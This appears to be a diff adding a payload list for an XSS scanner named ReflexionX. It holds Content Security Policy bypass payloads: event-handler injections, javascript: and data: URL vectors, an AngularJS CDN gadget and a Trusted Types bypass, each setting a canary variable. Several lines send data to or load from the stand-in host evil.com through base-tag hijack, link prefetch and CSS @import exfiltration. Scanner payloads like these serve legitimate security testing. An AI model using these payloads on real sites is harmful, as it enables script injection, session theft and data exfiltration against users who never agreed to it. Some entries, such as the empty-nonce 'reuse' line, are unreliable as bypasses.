@@ -1,0 +1,42 @@
+# ReflexionX v1.0.0 — CSP Bypass Payloads
+# Payloads designed to bypass Content Security Policy restrictions
+# Each payload sets window._xss_confirmed = 'CANARY'
+
+# Event handlers (bypass script-src restrictions)
+<img src=x onerror=window._xss_confirmed='CANARY'>
+<svg onload=window._xss_confirmed='CANARY'>
+<details open ontoggle=window._xss_confirmed='CANARY'>
+<input onfocus=window._xss_confirmed='CANARY' autofocus>
+<body onload=window._xss_confirmed='CANARY'>
+<marquee onstart=window._xss_confirmed='CANARY'>
+<video src=x onerror=window._xss_confirmed='CANARY'>
+<audio src=x onerror=window._xss_confirmed='CANARY'>
+
+# Base tag hijack (bypass script-src with relative paths)
+<base href="//evil.com/">
+
+# Meta refresh redirect
+<meta http-equiv="refresh" content="0;url=javascript:window._xss_confirmed='CANARY'">
+
+# Form action hijack (bypass script-src)
+<form action="javascript:window._xss_confirmed='CANARY'"><input type=submit>
+<form action="data:text/html,<script>window._xss_confirmed='CANARY'</script>"><input type=submit>
+
+# Object/Embed (may bypass script-src)
+<object data="javascript:window._xss_confirmed='CANARY'">
+<embed src="javascript:window._xss_confirmed='CANARY'">
+
+# Link prefetch (bypass connect-src)
+<link rel=prefetch href="//evil.com/exfil">
+
+# Style-based data exfiltration
+<style>@import url("//evil.com/exfil?data=stolen");</style>
+
+# JSONP gadget abuse (when CDN is whitelisted)
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script><div ng-app ng-csp><p ng-click="$event.target.ownerDocument.defaultView._xss_confirmed='CANARY'">click</p></div>
+
+# Script nonce reuse via cache
+<script nonce="">window._xss_confirmed='CANARY'</script>
+
+# Trusted Types bypass via default policy
+<script>trustedTypes.createPolicy('default',{createHTML:s=>s});document.body.innerHTML='<img src=x onerror=window._xss_confirmed=\\'CANARY\\'>'</script>
